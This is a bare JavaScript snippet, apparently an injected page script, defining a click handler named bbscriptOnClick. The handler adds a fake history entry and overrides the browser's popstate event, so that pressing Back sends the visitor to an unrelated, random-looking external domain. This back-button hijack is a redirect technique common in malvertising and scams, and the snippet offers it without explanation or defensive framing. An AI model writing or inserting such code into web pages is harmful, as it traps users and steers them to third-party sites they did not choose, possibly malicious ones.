function bbscriptOnClick(){var allowedHistorylength=2;if(history.length<allowedHistorylength){history.pushState(null,null,'#');}
window.onpopstate=function(e){if(e.state!==null){document.title=e.state.title;load(e.state.url);}else{location.replace("https://facket-openting.com/16ff3c84-66cb-4548-94af-bbf2c8f5b16e");}}}